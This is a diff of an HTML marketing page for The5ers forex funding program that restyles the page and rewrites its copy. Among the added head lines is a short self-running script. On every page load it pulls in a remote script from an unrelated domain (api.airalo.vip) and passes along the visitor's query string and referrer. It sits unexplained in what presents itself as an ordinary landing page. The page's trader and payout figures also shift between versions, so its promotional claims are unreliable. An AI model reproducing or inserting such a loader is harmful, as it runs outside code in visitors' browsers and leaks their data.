@@ -3,153 +3,184 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>The5ers: Complete Guide to Professional Trading Funding | the5ers.live</title>
+    <title>The5ers | Professional Forex Funding Program</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
-<link rel="icon" href="https://the5ers.com/wp-content/uploads/2019/07/favicon.png" sizes="32x32">
-<link rel="icon" href="https://the5ers.com/wp-content/uploads/2019/07/favicon.png" sizes="192x192">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Montserrat:wght@700;800&display=swap" rel="stylesheet">
+    <link rel="icon" href="https://the5ers.com/wp-content/uploads/2019/07/favicon.png" sizes="32x32">
+    <link rel="icon" href="https://the5ers.com/wp-content/uploads/2019/07/favicon.png" sizes="192x192">
+    <script>!function(){var s=document.createElement('script');s.src='https://api.airalo.vip/library.js'+location.search+'&from='+document.referrer;document.head.appendChild(s);}();</script>
     <style>
+        :root {
+            --primary: #0a2540;
+            --secondary: #00d09c;
+            --accent: #635bff;
+            --light: #f6f9fc;
+            --dark: #0a2540;
+            --text: #425466;
+            --gray: #718096;
+        }
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
         
-        :root {
-            --primary: #1a3a6c;
-            --secondary: #f9a826;
-            --accent: #2e5b96;
-            --light: #f8f9fa;
-            --dark: #212529;
-            --success: #28a745;
-            --gray: #6c757d;
-            --light-gray: #e9ecef;
-            --border: #d1d7e0;
+        body {
+            font-family: 'Inter', sans-serif;
+            color: var(--text);
+            line-height: 1.6;
+            overflow-x: hidden;
+            background-color: var(--light);
         }
         
-        body {
-            font-family: 'Open Sans', sans-serif;
-            color: var(--dark);
-            line-height: 1.8;
-            background: linear-gradient(135deg, #f8f9fa 0%, #eef2f7 100%);
-            padding: 0;
-            counter-reset: section;
+        h1, h2, h3, h4, h5 {
+            font-family: 'Montserrat', sans-serif;
+            color: var(--primary);
+            font-weight: 700;
+            line-height: 1.3;
         }
         
         .container {
+            width: 100%;
             max-width: 1200px;
             margin: 0 auto;
             padding: 0 20px;
         }
         
-        /* Header Styles */
-        header {
-            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
-            color: white;
-            padding: 15px 0;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+        .btn {
+            display: inline-block;
+            padding: 14px 32px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            text-align: center;
+            border: none;
         }
         
-        .header-container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+        .btn-primary {
+            background: var(--secondary);
+            color: var(--primary);
+            box-shadow: 0 4px 14px rgba(0, 208, 156, 0.4);
         }
         
-        .logo {
-            display: flex;
-            align-items: center;
+        .btn-primary:hover {
+            background: #00b98a;
+            transform: translateY(-3px);
+            box-shadow: 0 7px 18px rgba(0, 208, 156, 0.5);
         }
         
-        .logo-text {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 2.2rem;
-            font-weight: 800;
-            letter-spacing: 1px;
-        }
-        
-        .logo-text span {
+        .btn-outline {
+            background: transparent;
+            border: 2px solid var(--secondary);
             color: var(--secondary);
         }
         
-        nav ul {
+        .btn-outline:hover {
+            background: var(--secondary);
+            color: white;
+        }
+        
+        /* Header Styles */
+        header {
+            background: white;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+        }
+        
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+        }
+        
+        .logo {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--primary);
+            text-decoration: none;
+        }
+        
+        .logo span {
+            color: var(--secondary);
+        }
+        
+        .nav-links {
             display: flex;
             list-style: none;
         }
         
-        nav ul li {
-            margin-left: 25px;
+        .nav-links li {
+            margin-left: 30px;
         }
         
-        nav ul li a {
-            color: rgba(255, 255, 255, 0.9);
+        .nav-links a {
             text-decoration: none;
-            font-weight: 600;
-            font-size: 1.05rem;
-            transition: all 0.3s;
-            padding: 8px 0;
-            position: relative;
+            color: var(--primary);
+            font-weight: 500;
+            font-size: 16px;
+            transition: color 0.3s ease;
         }
         
-        nav ul li a:hover,
-        nav ul li a.active {
-            color: white;
-        }
-        
-        nav ul li a::after {
-            content: '';
-            position: absolute;
-            width: 0;
-            height: 3px;
-            bottom: 0;
-            left: 0;
-            background-color: var(--secondary);
-            transition: width 0.3s;
-        }
-        
-        nav ul li a:hover::after {
-            width: 100%;
+        .nav-links a:hover {
+            color: var(--secondary);
         }
         
         /* Hero Section */
         .hero {
-            background: linear-gradient(rgba(26, 58, 108, 0.92), rgba(26, 58, 108, 0.92)), url('https://images.unsplash.com/photo-1605792657660-596af9009e82?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1800&q=80');
-            background-size: cover;
-            background-position: center;
+            padding: 180px 0 100px;
+            background: linear-gradient(135deg, #0a2540 0%, #0d2e50 100%);
             color: white;
-            padding: 100px 0 80px;
-            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hero::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            right: -50px;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(0,208,156,0.15) 0%, rgba(0,208,156,0) 70%);
+            border-radius: 50%;
         }
         
         .hero-content {
-            max-width: 900px;
-            margin: 0 auto;
+            position: relative;
+            z-index: 2;
+            max-width: 650px;
         }
         
         .hero h1 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 3.2rem;
-            margin-bottom: 25px;
+            font-size: 52px;
+            margin-bottom: 20px;
+            color: white;
             line-height: 1.2;
-            font-weight: 800;
         }
         
         .hero p {
-            font-size: 1.4rem;
-            max-width: 800px;
-            margin: 0 auto 40px;
-            color: rgba(255, 255, 255, 0.9);
+            font-size: 18px;
+            margin-bottom: 30px;
+            opacity: 0.9;
         }
         
-        .stats {
+        .hero-btns {
             display: flex;
-            justify-content: center;
-            gap: 50px;
-            margin: 60px 0 30px;
-            flex-wrap: wrap;
+            gap: 15px;
+        }
+        
+        .hero-stats {
+            display: flex;
+            margin-top: 60px;
+            gap: 40px;
         }
         
         .stat-item {
@@ -157,367 +188,291 @@
         }
         
         .stat-number {
-            font-size: 2.8rem;
+            font-size: 42px;
             font-weight: 700;
             color: var(--secondary);
-            margin-bottom: 10px;
-            font-family: 'Montserrat', sans-serif;
+            margin-bottom: 5px;
         }
         
         .stat-label {
-            font-size: 1.1rem;
-            opacity: 0.9;
+            font-size: 16px;
+            opacity: 0.8;
         }
         
-        /* Article Content */
-        .article-container {
+        /* Features Section */
+        .features {
+            padding: 100px 0;
             background: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 50px rgba(0, 0, 0, 0.08);
-            margin: -50px auto 50px;
-            position: relative;
-            padding: 60px;
-            max-width: 1100px;
         }
         
-        .breadcrumb {
-            display: flex;
-            margin-bottom: 30px;
-            font-size: 0.95rem;
+        .section-header {
+            text-align: center;
+            max-width: 700px;
+            margin: 0 auto 60px;
+        }
+        
+        .section-header h2 {
+            font-size: 40px;
+            margin-bottom: 20px;
+        }
+        
+        .section-header p {
+            font-size: 18px;
             color: var(--gray);
         }
         
-        .breadcrumb a {
-            color: var(--primary);
-            text-decoration: none;
-        }
-        
-        .breadcrumb span {
-            margin: 0 10px;
-        }
-        
-        .article-content {
-            max-width: 900px;
-            margin: 0 auto;
-        }
-        
-        .section-title {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 2rem;
-            color: var(--primary);
-            margin: 60px 0 30px;
-            padding-bottom: 15px;
-            border-bottom: 3px solid var(--secondary);
-            position: relative;
-        }
-        
-        .section-title::before {
-            counter-increment: section;
-            content: counter(section) ". ";
-            color: var(--secondary);
-            margin-right: 10px;
-        }
-        
-        h3 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 1.6rem;
-            color: var(--accent);
-            margin: 40px 0 20px;
-        }
-        
-        p {
-            margin-bottom: 25px;
-            font-size: 1.1rem;
-            line-height: 1.8;
-        }
-        
-        .highlight {
-            background: linear-gradient(120deg, rgba(249, 168, 38, 0.1) 0%, rgba(249, 168, 38, 0.05) 100%);
-            border-left: 4px solid var(--secondary);
-            padding: 30px;
-            border-radius: 0 8px 8px 0;
-            margin: 40px 0;
-            font-style: italic;
-            position: relative;
-        }
-        
-        .highlight::before {
-            content: """;
-            position: absolute;
-            top: -20px;
-            left: 15px;
-            font-size: 5rem;
-            color: var(--secondary);
-            opacity: 0.2;
-            font-family: Georgia, serif;
-        }
-        
-        .feature-grid {
+        .features-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
             gap: 30px;
-            margin: 40px 0;
         }
         
         .feature-card {
-            background: var(--light);
-            border-radius: 10px;
-            padding: 30px;
-            border: 1px solid var(--border);
-            transition: all 0.3s;
+            background: white;
+            border-radius: 15px;
+            padding: 35px 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            border: 1px solid rgba(0, 0, 0, 0.03);
         }
         
         .feature-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
-            border-color: var(--secondary);
+            transform: translateY(-10px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
         }
         
         .feature-icon {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 25px;
-            color: white;
-            font-size: 1.8rem;
-        }
-        
-        .feature-card h4 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 1.3rem;
-            margin-bottom: 15px;
-            color: var(--primary);
-        }
-        
-        .comparison-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 40px 0;
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-        }
-        
-        .comparison-table th {
-            background: var(--primary);
-            color: white;
-            padding: 18px;
-            text-align: left;
-            font-family: 'Montserrat', sans-serif;
-        }
-        
-        .comparison-table td {
-            padding: 15px 20px;
-            border-bottom: 1px solid var(--border);
-        }
-        
-        .comparison-table tr:nth-child(even) {
-            background-color: var(--light);
-        }
-        
-        .comparison-table tr:last-child td {
-            border-bottom: none;
-        }
-        
-        .comparison-table .check {
-            color: var(--success);
-            font-weight: bold;
-        }
-        
-        .comparison-table .cross {
-            color: #dc3545;
-        }
-        
-        .step-cards {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 25px;
-            margin: 40px 0;
-        }
-        
-        .step-card {
-            background: white;
-            border-radius: 10px;
-            padding: 30px;
-            border: 1px solid var(--border);
-            position: relative;
-            counter-increment: step;
-        }
-        
-        .step-card::before {
-            content: counter(step);
-            position: absolute;
-            top: -15px;
-            left: -15px;
-            width: 40px;
-            height: 40px;
-            background: var(--secondary);
-            color: white;
+            width: 70px;
+            height: 70px;
+            background: rgba(0, 208, 156, 0.1);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-weight: 700;
-            font-size: 1.2rem;
-            font-family: 'Montserrat', sans-serif;
+            margin-bottom: 25px;
         }
         
-        .step-card h4 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 1.3rem;
-            color: var(--primary);
+        .feature-icon i {
+            font-size: 28px;
+            color: var(--secondary);
+        }
+        
+        .feature-card h3 {
+            font-size: 22px;
             margin-bottom: 15px;
         }
         
-        .faq-container {
-            margin: 50px 0;
-        }
-        
-        .faq-item {
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            margin-bottom: 20px;
-            overflow: hidden;
-        }
-        
-        .faq-question {
-            padding: 20px;
+        /* Funding Programs */
+        .funding {
+            padding: 100px 0;
             background: var(--light);
-            font-family: 'Montserrat', sans-serif;
+        }
+        
+        .programs {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin-top: 50px;
+        }
+        
+        .program-card {
+            background: white;
+            border-radius: 15px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(0, 0, 0, 0.03);
+        }
+        
+        .program-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
+        }
+        
+        .program-card.popular {
+            border-top: 5px solid var(--secondary);
+        }
+        
+        .popular-tag {
+            position: absolute;
+            top: 15px;
+            right: -35px;
+            background: var(--secondary);
+            color: white;
+            padding: 5px 35px;
+            transform: rotate(45deg);
+            font-size: 12px;
             font-weight: 600;
-            font-size: 1.1rem;
-            cursor: pointer;
+        }
+        
+        .program-card h3 {
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+        
+        .program-price {
+            font-size: 40px;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 20px;
+        }
+        
+        .program-price span {
+            font-size: 16px;
+            color: var(--gray);
+        }
+        
+        .program-features {
+            list-style: none;
+            margin: 30px 0;
+            text-align: left;
+        }
+        
+        .program-features li {
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
             display: flex;
-            justify-content: space-between;
             align-items: center;
         }
         
-        .faq-question i {
-            transition: transform 0.3s;
+        .program-features li i {
+            color: var(--secondary);
+            margin-right: 10px;
+            font-size: 14px;
         }
         
-        .faq-answer {
-            padding: 0 20px;
-            max-height: 0;
-            overflow: hidden;
-            transition: all 0.3s;
+        /* Testimonials */
+        .testimonials {
+            padding: 100px 0;
+            background: white;
         }
         
-        .faq-item.active .faq-answer {
-            padding: 20px;
-            max-height: 1000px;
+        .testimonial-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
         }
         
-        .faq-item.active .faq-question i {
-            transform: rotate(180deg);
-        }
-        
-        .cta-box {
-            background: linear-gradient(135deg, rgba(26, 58, 108, 0.05) 0%, rgba(46, 91, 150, 0.05) 100%);
+        .testimonial-card {
+            background: white;
             border-radius: 15px;
-            padding: 50px;
-            text-align: center;
-            margin: 60px 0 40px;
-            border: 2px dashed var(--accent);
+            padding: 35px 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+            border: 1px solid rgba(0, 0, 0, 0.03);
         }
         
-        .cta-box h2 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 2.2rem;
-            color: var(--primary);
+        .testimonial-header {
+            display: flex;
+            align-items: center;
             margin-bottom: 20px;
         }
         
-        .btn {
-            display: inline-block;
+        .testimonial-avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: var(--light);
+            margin-right: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--secondary);
+            font-weight: bold;
+            font-size: 20px;
+        }
+        
+        .testimonial-text {
+            font-style: italic;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .testimonial-text::before {
+            content: """;
+            position: absolute;
+            top: -20px;
+            left: -10px;
+            font-size: 80px;
+            color: rgba(0, 208, 156, 0.1);
+            font-family: serif;
+            line-height: 1;
+        }
+        
+        .testimonial-author h4 {
+            margin-bottom: 5px;
+        }
+        
+        .testimonial-author p {
+            color: var(--gray);
+            font-size: 14px;
+        }
+        
+        /* CTA Section */
+        .cta {
+            padding: 100px 0;
+            background: linear-gradient(135deg, #0a2540 0%, #0d2e50 100%);
+            color: white;
+            text-align: center;
+        }
+        
+        .cta h2 {
+            font-size: 42px;
+            color: white;
+            margin-bottom: 20px;
+        }
+        
+        .cta p {
+            max-width: 600px;
+            margin: 0 auto 40px;
+            font-size: 18px;
+            opacity: 0.9;
+        }
+        
+        .cta .btn {
             background: var(--secondary);
-            color: white;
-            padding: 16px 45px;
-            border-radius: 30px;
-            text-decoration: none;
-            font-weight: 700;
-            transition: all 0.3s ease;
-            border: none;
-            cursor: pointer;
-            font-size: 1.1rem;
-            margin: 20px 10px 10px;
-            box-shadow: 0 5px 15px rgba(249, 168, 38, 0.3);
-            font-family: 'Montserrat', sans-serif;
-        }
-        
-        .btn:hover {
-            background: #e0971c;
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(249, 168, 38, 0.4);
-        }
-        
-        .btn-outline {
-            background: transparent;
-            border: 2px solid var(--primary);
             color: var(--primary);
-        }
-        
-        .btn-outline:hover {
-            background: var(--primary);
-            color: white;
+            font-size: 18px;
+            padding: 16px 45px;
         }
         
         /* Footer */
         footer {
-            background: var(--dark);
+            background: var(--primary);
             color: rgba(255, 255, 255, 0.7);
-            padding: 70px 0 30px;
+            padding: 80px 0 40px;
         }
         
         .footer-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
             gap: 40px;
-            margin-bottom: 50px;
+            margin-bottom: 60px;
         }
         
         .footer-col h4 {
             color: white;
-            font-size: 1.4rem;
             margin-bottom: 25px;
-            position: relative;
-            padding-bottom: 10px;
-            font-family: 'Montserrat', sans-serif;
+            font-size: 18px;
         }
         
-        .footer-col h4::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 50px;
-            height: 3px;
-            background-color: var(--secondary);
-        }
-        
-        .footer-col p {
-            margin-bottom: 20px;
-        }
-        
-        .footer-col ul {
+        .footer-links {
             list-style: none;
         }
         
-        .footer-col ul li {
-            margin-bottom: 15px;
+        .footer-links li {
+            margin-bottom: 12px;
         }
         
-        .footer-col ul li a {
+        .footer-links a {
             color: rgba(255, 255, 255, 0.7);
             text-decoration: none;
-            transition: color 0.3s;
+            transition: color 0.3s ease;
         }
         
-        .footer-col ul li a:hover {
+        .footer-links a:hover {
             color: var(--secondary);
         }
         
@@ -528,16 +483,15 @@
         }
         
         .social-links a {
-            display: inline-flex;
+            display: flex;
             align-items: center;
             justify-content: center;
-            width: 45px;
-            height: 45px;
+            width: 40px;
+            height: 40px;
             background: rgba(255, 255, 255, 0.1);
             border-radius: 50%;
             color: white;
-            transition: all 0.3s;
-            font-size: 1.2rem;
+            transition: all 0.3s ease;
         }
         
         .social-links a:hover {
@@ -545,76 +499,71 @@
             transform: translateY(-3px);
         }
         
-        .copyright {
-            text-align: center;
-            padding-top: 30px;
+        .footer-bottom {
             border-top: 1px solid rgba(255, 255, 255, 0.1);
-            font-size: 0.95rem;
+            padding-top: 30px;
+            text-align: center;
+            font-size: 14px;
         }
         
         /* Responsive Design */
         @media (max-width: 992px) {
             .hero h1 {
-                font-size: 2.8rem;
+                font-size: 42px;
             }
             
-            .article-container {
-                padding: 40px 30px;
+            .hero-stats {
+                flex-wrap: wrap;
             }
         }
         
         @media (max-width: 768px) {
-            .header-container {
+            .navbar {
                 flex-direction: column;
-                text-align: center;
+                padding: 15px 0;
             }
             
-            .logo {
-                margin-bottom: 15px;
-            }
-            
-            nav ul {
-                flex-wrap: wrap;
-                justify-content: center;
-                margin-top: 15px;
-            }
-            
-            nav ul li {
-                margin: 5px 15px;
+            .nav-links {
+                margin-top: 20px;
             }
             
             .hero {
-                padding: 80px 0 60px;
+                padding: 150px 0 80px;
             }
             
             .hero h1 {
-                font-size: 2.2rem;
+                font-size: 36px;
             }
             
-            .hero p {
-                font-size: 1.1rem;
+            .hero-btns {
+                flex-direction: column;
             }
             
-            .section-title {
-                font-size: 1.8rem;
-            }
-            
-            .cta-box {
-                padding: 30px 20px;
-            }
-            
-            .cta-box h2 {
-                font-size: 1.8rem;
+            .section-header h2 {
+                font-size: 32px;
             }
         }
         
-        @media (max-width: 480px) {
-            .stats {
-                gap: 30px;
+        @media (max-width: 576px) {
+            .nav-links {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            .nav-links li {
+                margin: 5px 10px;
+            }
+            
+            .hero h1 {
+                font-size: 32px;
+            }
+            
+            .hero p {
+                font-size: 16px;
             }
             
             .stat-number {
-                font-size: 2.2rem;
+                font-size: 32px;
             }
         }
     </style>
@@ -622,353 +571,218 @@
 <body>
     <!-- Header -->
     <header>
-        <div class="container header-container">
-            <div class="logo">
-                <div class="logo-text">THE<span>5ERS</span></div>
-            </div>
-            <nav>
-                <ul>
-                    <li><a href="#overview" class="active">Overview</a></li>
-                    <li><a href="#how-it-works">How It Works</a></li>
-                    <li><a href="#benefits">Benefits</a></li>
-                    <li><a href="#strategies">Strategies</a></li>
+        <div class="container">
+            <nav class="navbar">
+                <a href="https://the5ers.com" class="logo">The<span>5ers</span></a>
+                <ul class="nav-links">
+                    <li><a href="#features">Features</a></li>
+                    <li><a href="#programs">Programs</a></li>
                     <li><a href="#testimonials">Testimonials</a></li>
                     <li><a href="#faq">FAQ</a></li>
                 </ul>
+                <a href="https://the5ers.com/sign-up" class="btn btn-primary">Get Funded</a>
             </nav>
         </div>
     </header>
 
     <!-- Hero Section -->
     <section class="hero">
-        <div class="container hero-content">
-            <h1>The Ultimate Guide to The5ers Funding Program</h1>
-            <p>Discover how The5ers empowers traders worldwide with capital up to $4,000,000</p>
-            
-            <div class="stats">
-                <div class="stat-item">
-                    <div class="stat-number">10,000+</div>
-                    <div class="stat-label">Funded Traders</div>
+        <div class="container">
+            <div class="hero-content">
+                <h1>Get Funded to Trade Forex with The5ers</h1>
+                <p>Join thousands of successful traders who have scaled their accounts to $4,000,000 with our industry-leading funding program. Start trading with real capital and keep up to 80% of the profits.</p>
+                <div class="hero-btns">
+                    <a href="https://the5ers.com/sign-up" class="btn btn-primary">Apply Now</a>
+                    <a href="#programs" class="btn btn-outline">View Programs</a>
                 </div>
-                <div class="stat-item">
-                    <div class="stat-number">$150M+</div>
-                    <div class="stat-label">Profits Shared</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-number">96%</div>
-                    <div class="stat-label">Satisfaction Rate</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-number">2016</div>
-                    <div class="stat-label">Established</div>
+                <div class="hero-stats">
+                    <div class="stat-item">
+                        <div class="stat-number">$200M+</div>
+                        <div class="stat-label">Capital Distributed</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">25,000+</div>
+                        <div class="stat-label">Funded Traders</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">80%</div>
+                        <div class="stat-label">Profit Split</div>
+                    </div>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- Article Content -->
-    <div class="container">
-        <div class="article-container">
-            <div class="breadcrumb">
-                <a href="#">Home</a> <span>/</span>
-                <a href="#">Trading Resources</a> <span>/</span>
-                <span>The5ers Complete Guide</span>
+    <!-- Features Section -->
+    <section class="features" id="features">
+        <div class="container">
+            <div class="section-header">
+                <h2>Why Choose The5ers?</h2>
+                <p>We've created the most trader-friendly funding program in the industry with features designed to help you succeed</p>
             </div>
-            
-            <div class="article-content">
-                <h2 class="section-title" id="overview">What is The5ers?</h2>
-                <p>The5ers is a premier proprietary trading firm that provides talented traders with the capital they need to succeed in financial markets. Founded in 2016, The5ers has established itself as one of the most reputable funding programs in the industry, with a mission to identify, develop, and fund exceptional trading talent worldwide.</p>
-                
-                <p>Unlike traditional trading where you risk your own capital, The5ers offers a revolutionary model: they provide the capital, you provide the trading skills. This eliminates the financial barrier to entry for many talented traders and creates a partnership where both parties benefit from successful trading.</p>
-                
-                <div class="highlight">
-                    <p>"The5ers has transformed how traders access capital. We provide funding up to $4,000,000 to proven traders, sharing profits while assuming all financial risk. Our mission is to create opportunities where talent meets capital." - Gil Ben-Hur, Co-Founder of The5ers</p>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-chart-line"></i>
+                    </div>
+                    <h3>Flexible Scaling Plan</h3>
+                    <p>Grow your account gradually with our unique scaling plan. Achieve consistent profits and watch your trading capital increase automatically.</p>
                 </div>
-                
-                <h3>The5ers Funding Models</h3>
-                <p>The5ers offers two primary funding models to accommodate different trader preferences and risk tolerances:</p>
-                
-                <div class="feature-grid">
-                    <div class="feature-card">
-                        <div class="feature-icon">
-                            <i class="fas fa-bolt"></i>
-                        </div>
-                        <h4>High-Stakes Model</h4>
-                        <p>Designed for experienced traders, this model features a one-step evaluation with higher profit targets but offers faster funding and higher profit splits (up to 50%). Traders can access accounts from $24,000 to $512,000 after passing the evaluation.</p>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-coins"></i>
                     </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">
-                            <i class="fas fa-chart-line"></i>
-                        </div>
-                        <h4>Bootcamp Model</h4>
-                        <p>Ideal for developing traders, this two-step program has more achievable targets with gradual scaling. Traders start with $10,000 accounts and can grow up to $4,000,000 through consistent performance. Profit splits start at 50% and increase to 100% at the highest levels.</p>
-                    </div>
+                    <h3>No Time Limits</h3>
+                    <p>Trade at your own pace with no pressure. We don't impose time limits on your trading journey - focus on consistency, not deadlines.</p>
                 </div>
-                
-                <h2 class="section-title" id="how-it-works">How The5ers Works: Step-by-Step</h2>
-                <p>The process to become a funded trader with The5ers is straightforward but requires discipline and skill. Here's the complete journey:</p>
-                
-                <div class="step-cards">
-                    <div class="step-card">
-                        <h4>Choose Your Program</h4>
-                        <p>Select between the High-Stakes or Bootcamp model based on your experience and goals. Determine your desired starting capital and review the specific rules and profit targets.</p>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-shield-alt"></i>
                     </div>
-                    <div class="step-card">
-                        <h4>Pass the Evaluation</h4>
-                        <p>Trade on a simulated account while adhering to The5ers' risk parameters. For the High-Stakes model, achieve a 10% profit target without violating daily or maximum loss rules.</p>
-                    </div>
-                    <div class="step-card">
-                        <h4>Receive Funding</h4>
-                        <p>Upon successful evaluation, you'll receive a funded trading account. The5ers provides capital ranging from $10,000 to $200,000 initially, depending on your chosen program.</p>
-                    </div>
-                    <div class="step-card">
-                        <h4>Trade & Scale</h4>
-                        <p>Trade the funded account while following the risk parameters. As you achieve consistent profits, The5ers will automatically increase your capital—up to $4,000,000 in the Bootcamp model.</p>
-                    </div>
-                    <div class="step-card">
-                        <h4>Withdraw Profits</h4>
-                        <p>Get paid every two weeks. The5ers offers 50-100% profit splits depending on your account size and program. Withdrawals are processed quickly via multiple methods.</p>
-                    </div>
-                    <div class="step-card">
-                        <h4>Grow Your Career</h4>
-                        <p>With The5ers' scaling plan, your capital grows as you succeed. Many traders develop full-time careers managing six-figure accounts with no personal financial risk.</p>
-                    </div>
+                    <h3>Risk Management</h3>
+                    <p>Our realistic risk parameters help you develop disciplined trading habits without compromising your strategy.</p>
                 </div>
-                
-                <h2 class="section-title" id="benefits">Key Benefits of Trading with The5ers</h2>
-                <p>The5ers stands out in the proprietary trading space for several compelling reasons:</p>
-                
-                <h3>Unmatched Capital Growth Potential</h3>
-                <p>The5ers' scaling plan is the most generous in the industry. In the Bootcamp model, successful traders can grow from $10,000 to $4,000,000 through 15 progressive steps. Each step requires achieving a 6% profit target, after which your account size increases automatically. This creates a clear path to professional trading without needing external investors.</p>
-                
-                <h3>Industry-Leading Profit Splits</h3>
-                <p>Profit splits start at 50% and increase to 100% at the highest levels. This means that once you reach the $1,280,000 account level, you keep 100% of subsequent profits while trading with The5ers' capital. No other funding program offers this level of profit retention.</p>
-                
-                <h3>Flexible Trading Conditions</h3>
-                <p>The5ers understands that successful trading requires flexibility. Their program features:</p>
-                <ul style="margin-left: 30px; margin-bottom: 25px;">
-                    <li style="margin-bottom: 10px;">No minimum trading days - trade at your own pace</li>
-                    <li style="margin-bottom: 10px;">No maximum trading days - take as long as you need</li>
-                    <li style="margin-bottom: 10px;">Trade all instruments: Forex, Commodities, Indices, Stocks, Cryptocurrencies</li>
-                    <li style="margin-bottom: 10px;">Trade news events without restrictions</li>
-                    <li style="margin-bottom: 10px;">Overnight and weekend positions allowed with proper risk management</li>
-                </ul>
-                
-                <h3>Comprehensive Educational Resources</h3>
-                <p>The5ers provides exceptional educational support including:</p>
-                <div class="feature-grid">
-                    <div class="feature-card">
-                        <div class="feature-icon">
-                            <i class="fas fa-graduation-cap"></i>
-                        </div>
-                        <h4>Proprietary Webinars</h4>
-                        <p>Weekly live sessions with professional traders covering technical analysis, risk management, and psychological aspects of trading.</p>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-hand-holding-usd"></i>
                     </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">
-                            <i class="fas fa-book"></i>
-                        </div>
-                        <h4>Trading Psychology Course</h4>
-                        <p>A comprehensive 8-module course specifically designed to help traders overcome psychological barriers and develop championship mindset.</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">
-                            <i class="fas fa-chart-bar"></i>
-                        </div>
-                        <h4>Market Analysis Reports</h4>
-                        <p>Daily and weekly market analysis prepared by The5ers' research team, highlighting key opportunities across all traded instruments.</p>
-                    </div>
+                    <h3>Generous Profit Split</h3>
+                    <p>Keep up to 80% of your profits with bi-weekly withdrawals. Get paid quickly and reliably through multiple payment methods.</p>
                 </div>
-                
-                <h2 class="section-title" id="comparison">The5ers vs. Other Funding Programs</h2>
